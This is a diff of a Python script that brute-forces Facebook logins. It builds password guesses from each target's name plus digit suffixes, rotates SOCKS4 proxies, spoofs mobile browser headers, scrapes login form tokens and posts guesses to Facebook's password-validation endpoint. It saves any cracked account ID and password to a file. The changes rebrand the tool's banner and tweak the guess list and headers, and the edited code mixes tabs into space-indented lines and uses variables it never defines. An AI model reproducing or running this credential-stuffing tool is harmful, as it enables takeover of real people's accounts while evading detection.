@@ -394,30 +394,11 @@ def passwrd():
                                 else:
                                         pwv.append(frs+frs)
                                         pwv.append(frs+' '+frs)
-                                        pwv.append('zaxozaxo')
-                                        pwv.append('zaxo12345')
-                                        pwv.append('hamahama')
-                                        pwv.append('hama12345')
                                         pwv.append(frs+"12")
                                         pwv.append(frs+"123")
                                         pwv.append(frs+"1234")
                                         pwv.append(frs+"12345")
                                         pwv.append(frs+"123456")
-                                        pwv.append(frs+"1234567")
-                                        pwv.append(frs+"12345678")
-                                        pwv.append(frs+"1122")
-                                        pwv.append(frs+"112233")
-                                        pwv.append(frs+"1212")
-                                        pwv.append(frs+"4321")
-                                        pwv.append(frs+"321")
-                                        pwv.append(frs+"54321")
-                                        pwv.append("123"+frs)
-                                        pwv.append("1234"+frs)
-                                        pwv.append("12345"+frs)
-                                        pwv.append("123456"+frs)
-                                        pwv.append("12345678"+frs)
-                                        pwv.append("123456789"+frs)
-                                        pwv.append("1234567890"+frs)
                                         pwv.append(frs+'12'+frs)
                                         pwv.append(frs+'123'+frs)
                                         pwv.append(frs+'12345'+frs)
@@ -433,32 +414,13 @@ def passwrd():
                                 if len(frs)<3:
                                         pwv.append(nmf)
                                 else:
-                                        pwv.append(frs+frs)
+					pwv.append(nmf)
                                         pwv.append(frs+' '+frs)
-                                        pwv.append('zaxozaxo')
-                                        pwv.append('zaxo12345')
-                                        pwv.append('hamahama')
-                                        pwv.append('hama12345')
                                         pwv.append(frs+"12")
                                         pwv.append(frs+"123")
                                         pwv.append(frs+"1234")
                                         pwv.append(frs+"12345")
                                         pwv.append(frs+"123456")
-                                        pwv.append(frs+"1234567")
-                                        pwv.append(frs+"12345678")
-                                        pwv.append(frs+"1122")
-                                        pwv.append(frs+"112233")
-                                        pwv.append(frs+"1212")
-                                        pwv.append(frs+"4321")
-                                        pwv.append(frs+"321")
-                                        pwv.append(frs+"54321")
-                                        pwv.append("123"+frs)
-                                        pwv.append("1234"+frs)
-                                        pwv.append("12345"+frs)
-                                        pwv.append("123456"+frs)
-                                        pwv.append("12345678"+frs)
-                                        pwv.append("123456789"+frs)
-                                        pwv.append("1234567890"+frs)
                                         pwv.append(frs+'12'+frs)
                                         pwv.append(frs+'123'+frs)
                                         pwv.append(frs+'12345'+frs)
@@ -493,7 +455,7 @@ def passwrd():
 
 def crack(idf,pwv):
         global loop,ok,cp
-        sys.stdout.write(f"\r\033[1;32m [ 𝑅𝑂𝑌𝐴𝐿 ]{P} [{H}{loop}{P}][{H}{len(id)}{P}] [{H}𝑂𝐾{m}${H}{ok}{P}]  "),
+        sys.stdout.write(f"\r\033[1;32m [ 𝐑𝐀𝐖𝐀 ]{P} [{H}{loop}{P}][{H}{len(id)}{P}] [{H}𝑂𝐾{m}${H}{ok}{P}]  "),
         sys.stdout.flush()
         #ua = random.choice(ugen)
         #ua2 = random.choice(ugen2)
@@ -502,59 +464,59 @@ def crack(idf,pwv):
                 try:
                         nip=random.choice(prox)
                         proxs= {'http': 'socks4://'+nip}
-                        ses.headers.update = {
-    'authority': 'm.facebook.com',
+                        ses.headers.update = {'authority': 'm.facebook.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-US,en;q=0.9',
     'cache-control': 'max-age=0',
     'dpr': '3',
-    'referer': 'https://m.facebook.com/',
+    'referer': 'https://m.facebook.com/bookmarks/',
     'sec-ch-prefers-color-scheme': 'light',
     'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
     'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
     'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-model': '"STK-L21"',
+    'sec-ch-ua-model': '"JKM-LX1"',
     'sec-ch-ua-platform': '"Android"',
-    'sec-ch-ua-platform-version': '"10.0.0"',
+    'sec-ch-ua-platform-version': '"9.0.0"',
     'sec-fetch-dest': 'document',
     'sec-fetch-mode': 'navigate',
     'sec-fetch-site': 'same-origin',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 12; Nokia X20 Build/SKQ1.210821.001; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36',
-    'viewport-width': '980',}
-                        p = ses.get('https://p.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
-                        dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
-                        koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
-                        koki+=' m_pixel_ratio=2.625; wd=412x756'
-                        headers = {
-    'authority': 'm.facebook.com',
+    'user-agent': ua,
+    'viewport-width': '980',
+}
+			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
+			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
+			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
+			koki+=' m_pixel_ratio=1.75; wd=412x814'
+			heade = {'authority': 'm.facebook.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-US,en;q=0.9',
     'cache-control': 'max-age=0',
     'dpr': '3',
-    'referer': 'https://m.facebook.com/',
+    'referer': 'https://m.facebook.com/bookmarks/',
     'sec-ch-prefers-color-scheme': 'light',
     'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
     'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
     'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-model': '"STK-L21"',
+    'sec-ch-ua-model': '"JKM-LX1"',
     'sec-ch-ua-platform': '"Android"',
-    'sec-ch-ua-platform-version': '"10.0.0"',
+    'sec-ch-ua-platform-version': '"9.0.0"',
     'sec-fetch-dest': 'document',
     'sec-fetch-mode': 'navigate',
     'sec-fetch-site': 'same-origin',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 7.1.2; Nokia 1011 Build/NZH54D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Mobile Safari/537.36',
-    'viewport-width': '980',}
-                        po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=headers,allow_redirects=False,proxies=proxs)
+    'user-agent': ua,
+    'viewport-width': '980',
+}
+			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
 #                        if "checkpoint" in po.cookies.get_dict().keys():
                         if "c_user" in ses.cookies.get_dict().keys():
                                 ok+=1
                                 coki=po.cookies.get_dict()
                                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                                print(f'\r\033[1;32m [𝑅𝑂𝑌𝐴𝐿-𝑂𝐾] {idf} | {pw} ')
+                                print(f'\r\033[1;32m [𝐑𝐀𝐖𝐀-𝑂𝐾] {idf} | {pw} ')
                                 open('/sdcard/𝑅𝑂𝑌𝐴𝐿-𝑂𝐾.txt','a').write(idf+' | '+pw+'\n')
                                 break
                         else:
